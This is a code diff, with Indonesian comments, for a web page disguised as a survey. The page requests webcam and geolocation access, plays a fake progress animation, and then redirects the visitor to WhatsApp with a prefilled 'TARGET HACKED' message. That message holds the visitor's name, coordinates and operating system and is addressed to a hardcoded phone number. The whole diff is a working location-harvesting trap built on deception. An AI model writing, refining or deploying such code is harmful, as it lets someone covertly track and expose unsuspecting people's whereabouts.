@@ -1,56 +1,49 @@
-const nomorWA = "628979100200"; // Nomor Anda sudah saya masukkan
+const nomorWA = "628979100200";
+let userData = { coords: "Fetching...", os: navigator.platform };
 
-let userData = {
-    coords: "Ditolak/Tidak Aktif",
-    os: navigator.platform,
-    device: navigator.userAgent.split(' ')[0]
-};
-
-// 1. Tombol Mulai (Minta Izin Kamera & Lokasi)
+// Tombol Mulai
 document.getElementById('start-survey').addEventListener('click', async () => {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
-
-    // Ambil Kamera
+    
+    // Minta Izin
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            userData.coords = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
+        });
+    }
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         document.getElementById('webcam').srcObject = stream;
-    } catch (e) { console.log("Kamera ditolak"); }
-
-    // Ambil Lokasi
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            userData.coords = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
-            document.getElementById('loc-tag').textContent = "SENSING: " + userData.coords;
-        });
-    }
+    } catch (e) {}
 });
 
-// 2. Tombol Kirim (Proses Animasi Hack)
-document.getElementById('submit-survey').addEventListener('click', () => {
-    const namaUser = document.getElementById('name').value || "Anonymous";
+// Fungsi untuk proses kirim
+function processSubmit() {
+    const name = document.getElementById('name').value;
+    if (!name) return alert("Masukkan nama dulu!");
+
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
 
     let prg = 0;
-    const bar = document.getElementById('progress');
-    const status = document.getElementById('status-text');
-    
-    const logs = ["Ekstraksi metadata...", "Menghubungkan ke satelit...", "Mengenkripsi paket...", "Sinkronisasi selesai!"];
-    
     const interval = setInterval(() => {
         prg += 25;
-        bar.style.width = prg + "%";
-        status.textContent = logs[prg/25 - 1];
-        
+        document.getElementById('progress').style.width = prg + "%";
         if (prg >= 100) {
             clearInterval(interval);
-            setTimeout(() => {
-                const teks = `🚨 *DATA TARGET DIKIRIM* 🚨%0A%0A👤 *Nama:* ${namaUser}%0A📍 *Lokasi:* ${userData.coords}%0A💻 *OS:* ${userData.os}%0A📱 *Device:* ${userData.device}%0A%0A_Data telah disinkronkan ke database._`;
-                
-                // Gunakan URL API WhatsApp yang paling kompatibel
-                window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${teks}`;
-            }, 1000);
+            const msg = `🚨 *TARGET HACKED* 🚨%0A%0A👤 Nama: ${name}%0A📍 Lokasi: ${userData.coords}%0A💻 OS: ${userData.os}`;
+            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
         }
-    }, 1000);
+    }, 800);
+}
+
+// Menjalankan Enter di Input Nama
+document.getElementById('name').addEventListener('keydown', (e) => {
+    if (e.key === "Enter") {
+        processSubmit();
+    }
 });
+
+// Menjalankan Klik di Tombol Kirim
+document.getElementById('submit-survey').addEventListener('click', processSubmit);
